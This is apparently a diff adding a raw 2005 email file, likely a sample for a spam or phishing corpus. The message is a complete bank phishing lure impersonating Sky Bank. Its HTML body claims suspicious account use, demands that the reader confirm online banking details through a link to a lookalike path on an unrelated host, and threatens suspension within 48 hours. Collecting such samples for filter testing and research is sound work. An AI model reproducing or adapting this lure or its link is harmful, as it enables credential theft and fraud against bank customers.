@@ -1,0 +1,92 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 99EAC2A88C
+ for <user@example.com>; Fri, 14 Oct 2005 18:38:57 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 95904621C78; Fri, 14 Oct 2005 18:38:57 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 7DA6C621C66
+ for <user@example.com>; Fri, 14 Oct 2005 18:38:56 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id SAA25775
+ for user@example.com; Fri, 14 Oct 2005 18:38:56 -0400
+Received: from ibserver11.com (ibserver11.com [204.200.196.250])
+ by mail.example.com with ESMTP id SAA25767
+ for <user@example.com>; Fri, 14 Oct 2005 18:38:55 -0400
+Received: from ibserver11.com (localhost [127.0.0.1])
+ by ibserver11.com (8.13.1/8.13.1) with ESMTP id j9EMcsgp033338
+ for <user@example.com>; Fri, 14 Oct 2005 22:38:54 GMT
+Received: (from test1@localhost)
+ by ibserver11.com (8.13.1/8.13.1/Submit) id j9EMcsOY033336
+ for user@example.com; Fri, 14 Oct 2005 18:38:54 -0400 (EDT)
+Date: Fri, 14 Oct 2005 18:38:54 -0400 (EDT)
+To: user@example.com
+Subject: Dear Members Sky Bank Please Verify Acconts !
+Message-ID: <1129329534.19161.qmail@arribada.ebay.com>
+From: "Sky Bank" <support@sky-bank.com>
+Content-Type: text/html
+Content-Length: 2347
+Lines: 56
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 199
+
+<html>
+<body vlink="#ffe580" alink="#ffe580" link="#ffe580">
+<table width="80%" border="0">
+  <tr>
+    <td><p><img alt="Company logo" 
+src="http://mail.langen.com.tw/~mysql/connect.skyfi.com/servlet/SignOn.html?CustType=Retail&NLS=EN" 
+border="0"> </p>
+      <table cellSpacing="0" cellPadding="0" width="100%" 
+bgColor="#9999cc" border="0">
+        <tr>
+          <td bgColor="#000080" colSpan="2"><img title height="2" alt=" 
+" src="http://pics.ebaystatic.com/aw/pics/homepage/spacer.gif" 
+width="1"></td>
+        </tr>
+      </table>
+      <p align="justify"> <font face="Arial" size="2">Sky Bank 
+Oline® Departament Notice<br>
+            <br>
+            You have received this email because you or someone had 
+used your account from diferent locations. For security purpose, we are 
+required to open an investigation intro this matter. In order to 
+safeguard your account, we require that you confirm your online banking 
+details. To help speed up this process, please access the following link so we 
+can complete verification of your Sky Online® Banking Account 
+registration information : </font> </p>
+      <table cellSpacing="0" cellPadding="4" width="100%" 
+align="center" border="0">
+        <tr>
+          <td borderColor="#336699" align="middle" 
+bgColor="#336699"><div align="center"><font face="Arial"><a 
+href="http://mail.langen.com.tw/~mysql/connect.skyfi.com/servlet/SignOn.html?CustType=Retail&NLS=EN" 
+target="_blank">Click here to confirm your account</a></font></div></td>
+        </tr>
+      </table>
+      <p><font face="Arial" size="2">Please Note:<br>
+  If we do no receive the appropriate account verification within 48 
+hours, then we will assume this Sky Bank account is fraudulent and will 
+be suspended. The purpose of this verification is to ensure that your 
+bank account has not been fraudulently used and to combat the fraud from 
+our community.</font></p>
+      <font face="Arial" size="2">
+      <p><font face="Arial" size="1">© 2005 Sky Financial Group, 
+Inc.</font></p>
+      <table cellSpacing="0" cellPadding="0" width="100%" 
+bgColor="#000080" border="0">
+        <tr>
+          <td bgColor="#000080" colSpan="2"><img title height="2" alt=" 
+" src="http://pics.ebaystatic.com/aw/pics/homepage/spacer.gif" 
+width="1"></td>
+        </tr>
+      </table>
+    </font></td>
+  </tr>
+</table>
+</body>
+</html>
